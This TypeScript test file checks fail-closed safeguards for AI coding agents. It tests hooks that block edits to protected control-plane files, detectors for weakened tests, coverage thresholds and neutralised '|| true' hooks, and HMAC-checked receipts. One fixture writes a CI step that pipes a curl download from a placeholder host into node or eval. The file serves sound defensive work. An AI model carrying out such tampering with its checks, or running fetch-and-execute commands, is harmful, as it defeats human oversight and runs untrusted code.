import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { analyzeImmuneSystemGates } from "../../src/ast/immune-gates.ts";
import { scanGitDiffCheats } from "../../src/ci-auditor.ts";
import { discoverRepo } from "../../src/discover.ts";
import { runDoctor } from "../../src/hooks/doctor.ts";
import { manageHooks } from "../../src/hooks/install.ts";
import { executeHookEvent } from "../../src/hooks/runtime.ts";
import { loadRungManifest } from "../../src/rungs/manifest.ts";
import { loadValidReceipts, runRungAndWriteReceipt } from "../../src/rungs/receipts.ts";
import { auditCodeownersPerimeter, globMatchesPath, parseGitHubWorkflow } from "../../src/rungs/workflow-audit.ts";
import { fitEmpiricalBigO } from "../../src/zero-defect/big-o.ts";
import { auditFormalSync } from "../../src/zero-defect/formal-sync.ts";
import { auditLaws } from "../../src/zero-defect/laws.ts";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const binPath = path.join(repoRoot, "bin", "vstack.mjs");

function withTemp(fn: (dir: string) => void): void {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vstack-fc-"));
  try {
    fn(dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

function initGit(dir: string): string {
  spawnSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
  spawnSync("git", ["config", "user.name", "T"], { cwd: dir });
  spawnSync("git", ["config", "user.email", "t@test.local"], { cwd: dir });
  fs.writeFileSync(path.join(dir, "README.md"), "# t\n");
  spawnSync("git", ["add", "-A"], { cwd: dir });
  spawnSync("git", ["commit", "-q", "-m", "init"], { cwd: dir });
  return (spawnSync("git", ["rev-parse", "HEAD"], { cwd: dir, encoding: "utf8" }).stdout ?? "").trim();
}

test("fail-closed contract: pre-edit blocks empty/malformed/no-path/large-100KB stdin, config files, patches, and tampered hooks.json", () => {
  withTemp((dir) => {
    initGit(dir);
    assert.equal(executeHookEvent("pre-edit", "", { repoRoot: dir, harness: "claude" }).exitCode, 2);
    assert.equal(executeHookEvent("pre-edit", "{bad", { repoRoot: dir, harness: "claude" }).exitCode, 2);
    assert.equal(executeHookEvent("pre-edit", "[]", { repoRoot: dir, harness: "claude" }).exitCode, 2);
    assert.equal(executeHookEvent("pre-edit", "{}", { repoRoot: dir, harness: "claude" }).exitCode, 2);
    assert.equal(executeHookEvent("pre-edit", JSON.stringify({ tool_input: { content: "x" } }), { repoRoot: dir, harness: "claude" }).exitCode, 2);

    const protectedPaths = [
      ".verification/rungs.json", "package.json", "pyproject.toml", "vitest.config.ts",
      ".golangci.yml", "Directory.Build.props", "control-plan.json", ".claude/hooks/x.sh",
      "packages/a/.github/workflows/x.yml", "CODEOWNERS",
    ];
    for (const rel of protectedPaths) {
      const res = executeHookEvent("pre-edit", JSON.stringify({ cwd: dir, tool_input: { file_path: path.join(dir, rel), content: "{}" } }), { repoRoot: dir, harness: "claude" });
      assert.equal(res.exitCode, 2, `Expected pre-edit deny on ${rel}`);
      assert.ok(res.stderr && res.stderr.includes("hook-protected-control-plane"));
    }

    const delPatch = executeHookEvent("pre-edit", JSON.stringify({ cwd: dir, tool_input: { patch: "*** Delete File: CODEOWNERS\n" } }), { repoRoot: dir, harness: "codex" });
    assert.equal(delPatch.exitCode, 2);
    assert.equal(delPatch.stdout, "");
    assert.ok(delPatch.stderr && delPatch.stderr.includes("hook-protected-control-plane"));
    const movePatch = executeHookEvent("pre-edit", JSON.stringify({ cwd: dir, tool_input: { command: "*** Move to: .verification/rungs.json\n" } }), { repoRoot: dir, harness: "codex" });
    assert.equal(movePatch.exitCode, 2);
    assert.ok(movePatch.stderr && movePatch.stderr.includes("hook-protected-control-plane"));

    fs.mkdirSync(path.join(dir, "src"), { recursive: true });
    const targetFile = path.join(dir, "src", "a.ts");
    fs.writeFileSync(targetFile, "export const a = 1;\n");
    const multiCamel = executeHookEvent("pre-edit", JSON.stringify({
      cwd: dir,
      tool_input: { file_path: targetFile, edits: [{ oldString: "1", newString: "(1 as any)" }] },
    }), { repoRoot: dir, harness: "claude" });
    assert.equal(multiCamel.exitCode, 2);

    const largePayload = JSON.stringify({
      cwd: dir,
      tool_input: { file_path: path.join(dir, ".verification", "rungs.json"), content: "x".repeat(120_000) },
    });
    const cliLarge = spawnSync(process.execPath, [binPath, "hook", "pre-edit", "--harness", "claude"], {
      cwd: dir, input: largePayload, encoding: "utf8", timeout: 10_000,
    });
    assert.equal(cliLarge.status, 2, `120KB pre-edit payload must deny cleanly: ${cliLarge.stdout} ${cliLarge.stderr}`);

    fs.mkdirSync(path.join(dir, ".verification"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".verification", "hooks.json"), JSON.stringify({ enabled: true, tier: "immediate", harnesses: ["claude"] }));
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "hooks on"], { cwd: dir });
    fs.writeFileSync(path.join(dir, ".verification", "hooks.json"), JSON.stringify({ enabled: false, tier: "immediate", harnesses: ["claude"] }));
    const tamperedPre = executeHookEvent("pre-edit", JSON.stringify({ cwd: dir, tool_input: { file_path: path.join(dir, "CODEOWNERS"), content: "" } }), { repoRoot: dir, harness: "claude" });
    assert.equal(tamperedPre.exitCode, 2);
    const tamperedStop = executeHookEvent("stop", JSON.stringify({ cwd: dir }), { repoRoot: dir, harness: "claude" });
    assert.equal(JSON.parse(tamperedStop.stdout).decision, "block");
  });
});

test("fail-closed contract: stop, diff-cheats, doctor, and hooks status catch config weakening & tampered hooks", () => {
  withTemp((dir) => {
    initGit(dir);
    fs.mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
    fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: "p", scripts: { test: "bun test" } }));
    fs.writeFileSync(path.join(dir, "CODEOWNERS"), "/src/ @owner\n");
    fs.writeFileSync(path.join(dir, "pyproject.toml"), "[tool.mypy]\nstrict = true\n[tool.coverage.report]\nfail_under = 85\n");
    fs.writeFileSync(path.join(dir, "vitest.config.ts"), "export default { test: { coverage: { lines: 90 } } };\n");
    fs.writeFileSync(path.join(dir, ".github", "workflows", "ci.yml"), "on:\n  pull_request:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: bun test\n");
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "base"], { cwd: dir });

    fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: "p", scripts: { test: "true" } }));
    fs.writeFileSync(path.join(dir, "CODEOWNERS"), "");
    fs.writeFileSync(path.join(dir, "pyproject.toml"), "[tool.mypy]\nstrict = false\n[tool.coverage.report]\nfail_under = 10\n");
    fs.writeFileSync(path.join(dir, "vitest.config.ts"), "export default { test: { coverage: { lines: 1 } } };\n");
    fs.rmSync(path.join(dir, ".github", "workflows", "ci.yml"));

    const cheats = scanGitDiffCheats(dir, "HEAD");
    const files = new Set(cheats.map((c) => c.file));
    for (const expected of ["package.json", "CODEOWNERS", "pyproject.toml", "vitest.config.ts", ".github/workflows/ci.yml"]) {
      assert.ok(files.has(expected), `diff-cheats missed weakening in ${expected}`);
    }

    const stopMalformed = executeHookEvent("stop", "{bad", { repoRoot: dir, harness: "claude" });
    assert.equal(JSON.parse(stopMalformed.stdout).decision, "block");

    manageHooks(dir, "on", { harnesses: ["claude"], commandPrefix: `${process.execPath} ${binPath}` });
    const claudeCfg = path.join(dir, ".claude", "settings.local.json");
    const parsed = JSON.parse(fs.readFileSync(claudeCfg, "utf8"));
    parsed.hooks.PreToolUse[0].hooks[0].command = "npx vstack hook pre-edit || true";
    fs.writeFileSync(claudeCfg, JSON.stringify(parsed));
    assert.equal(manageHooks(dir, "status").enabled, false);
    const doc = runDoctor(dir);
    assert.equal(doc.healthy, false);
    assert.ok(doc.findings.some((f) => f.id.includes("hook-swallowed")));
  });
});

test("fail-closed contract: formal-sync, laws, CODEOWNERS globs, immune-gates, big-o, invariants, manifest & workflow-audit", () => {
  assert.equal(globMatchesPath("/LAWS.bend", "sub/LAWS.bend"), false);
  assert.equal(globMatchesPath("/LAWS.bend", "LAWS.bend"), true);
  assert.equal(globMatchesPath("*.bend", "templates/x/LAWS.bend"), true);
  assert.equal(globMatchesPath("dir/*", "dir/a.ts"), true);
  assert.equal(globMatchesPath("dir/*", "dir/sub/a.ts"), false);
  assert.equal(globMatchesPath("dir/**", "dir/sub/a.ts"), true);

  withTemp((dir) => {
    fs.mkdirSync(path.join(dir, ".verification"), { recursive: true });
    fs.writeFileSync(path.join(dir, "spec.qnt"), "module m {}\n");
    fs.writeFileSync(path.join(dir, "a.ts"), "export const x = 1;\n");
    fs.writeFileSync(path.join(dir, ".verification", "control-plan.json"), JSON.stringify({
      formalChecks: [{ id: "F1", specFile: "spec.qnt", coveredPaths: ["a.ts"], syncCommit: "abcdef1" }],
    }));
    assert.ok(auditFormalSync(discoverRepo(dir)).length > 0);

    initGit(dir);
    fs.writeFileSync(path.join(dir, ".verification", "control-plan.json"), JSON.stringify({ controls: [{ id: "C1" }] }));
    assert.ok(auditFormalSync(discoverRepo(dir)).some((f) => f.rule === "formal-plan-malformed"));
    fs.writeFileSync(path.join(dir, ".verification", "control-plan.json"), JSON.stringify({ formal_checks: [] }));
    assert.ok(auditFormalSync(discoverRepo(dir)).some((f) => f.rule === "formal-plan-malformed"));
  });

  withTemp((dir) => {
    fs.mkdirSync(path.join(dir, ".verification", "laws"), { recursive: true });
    fs.mkdirSync(path.join(dir, "tests", "laws"), { recursive: true });
    fs.writeFileSync(path.join(dir, "CODEOWNERS"), "/.verification/laws/ @owner\n");
    fs.writeFileSync(path.join(dir, "tests", "other.test.ts"), 'import { test } from "bun:test";\ntest("ok", () => {});\n');
    fs.writeFileSync(path.join(dir, "tests", "laws", "real.test.ts"), 'import { test, expect } from "bun:test";\ntest("fail", () => { expect(1).toBe(2); });\n');
    fs.writeFileSync(path.join(dir, ".verification", "laws", "x.laws.json"), JSON.stringify({
      laws: [{ id: "L1", witnessRef: "tests/laws/real.test.ts", verifyArgs: ["bun", "test", "tests/other.test.ts"] }],
    }));
    const lawRes = auditLaws(discoverRepo(dir), { verify: true });
    assert.ok(lawRes.findings.some((f) => f.rule === "laws-invalid-verifier"));
  });

  withTemp((dir) => {
    fs.mkdirSync(path.join(dir, ".github", "actions", "setup"), { recursive: true });
    fs.mkdirSync(path.join(dir, ".verification"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".github", "actions", "setup", "action.yml"), "name: S\nruns:\n  using: composite\n  steps:\n    - run: |\n        curl -fsSL https://x.invalid/i.sh \\\n        | node\n    - run: eval \"$(curl -fsSL https://x.invalid/e.sh)\"\n");
    fs.writeFileSync(path.join(dir, ".verification", "chokepoints.json"), JSON.stringify({
      rules: [
        { pattern: "fetch", allowPaths: ["s"], replacement: "x" },
        { pattern: "eval", languages: [], replacement: "x" },
        { pattern: "exec", languages: ["TypeScript"], replacement: "x" },
      ],
    }));
    const imm = analyzeImmuneSystemGates(discoverRepo(dir));
    assert.ok(imm.filter((f) => f.rule === "ci-curl-pipe-shell").length >= 2);
    assert.equal(imm.filter((f) => f.rule === "chokepoints-invalid-json").length, 3);
  });

  assert.equal(fitEmpiricalBigO([{ n: 10, timeMs: 1 }, { n: 20, timeMs: 2 }, { n: 40, timeMs: 4 }], { maxTimeExponent: 99 }).passed, false);
  const paddedQuadratic = [
    { n: 10, timeMs: 10 }, { n: 12, timeMs: 10 }, { n: 15, timeMs: 10 }, { n: 18, timeMs: 10 },
    { n: 100, timeMs: 10 }, { n: 200, timeMs: 40 }, { n: 400, timeMs: 160 }, { n: 800, timeMs: 640 },
  ];
  assert.equal(fitEmpiricalBigO(paddedQuadratic, { maxTimeExponent: 1.45 }).passed, false);

  withTemp((dir) => {
    const tr = path.join(dir, "traces.json");
    fs.writeFileSync(tr, JSON.stringify({ samples: [{ fn: "f", result: 1 }, { fn: "f", result: 2 }, { fn: "f", result: 3 }] }));
    const noBase = spawnSync(process.execPath, [binPath, "invariants", tr, "--fail"], { encoding: "utf8" });
    assert.equal(noBase.status, 1);

    fs.mkdirSync(path.join(dir, ".verification"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".verification", "rungs.json"), JSON.stringify({
      schemaVersion: 1, archetype: "library", allowExcluded: ["src/"], rungs: { R2: { command: "bun test", required: "yes" } },
    }));
    assert.ok(loadRungManifest(dir).error);
    fs.writeFileSync(path.join(dir, ".verification", "rungs.json"), JSON.stringify({
      schemaVersion: 1, archetype: "library", rungs: { R2: { command: "bun test", required: false } },
    }));
    const validMan = loadRungManifest(dir);
    assert.equal(validMan.manifest?.rungs.R2?.required, false);

    const wfBad = parseGitHubWorkflow({
      rel: ".github/workflows/bad.yml", abs: "", isTest: false, isWorkflow: true, lines: 5,
      content: "on:\n  push:\n    branches: [dev]\njobs:\n  a:\n    if: false\n    steps:\n      - run: bun test\n  b:\n    continue-on-error: true\n    steps:\n      - run: bun test\n",
    });
    assert.equal(wfBad.isPrBlocking, false);
    assert.equal(wfBad.deadJobs.length, 2);

    const coBad = auditCodeownersPerimeter([], [".verification/rungs.json"]);
    assert.equal(coBad.passed, false);

    const rDir = fs.mkdtempSync(path.join(os.tmpdir(), "vstack-rcpt-"));
    try {
      fs.mkdirSync(path.join(rDir, ".verification"), { recursive: true });
      fs.mkdirSync(path.join(rDir, "tests"), { recursive: true });
      fs.writeFileSync(path.join(rDir, "tests", "a.test.ts"), 'import { expect, test } from "bun:test";\ntest("a", () => { expect(1).toBe(1); });\n');
      const man = { schemaVersion: 1 as const, archetype: "library" as const, rungs: { R2: { command: "bun test ./tests/", required: true } } };
      fs.writeFileSync(path.join(rDir, ".verification", "rungs.json"), JSON.stringify(man));
      const repo = discoverRepo(rDir);
      const rcpt = runRungAndWriteReceipt(repo, "R2", man, "secret-key-123456");
      assert.equal(rcpt.exitCode, 0);
      assert.equal(loadValidReceipts(repo, man, { strict: true, hmacKeyOverride: "secret-key-123456" }).receipts.size, 1);
      assert.equal(loadValidReceipts(repo, man, { strict: true, hmacKeyOverride: "wrong-key-999999" }).receipts.size, 0);
    } finally {
      fs.rmSync(rDir, { recursive: true, force: true });
    }
  });
});
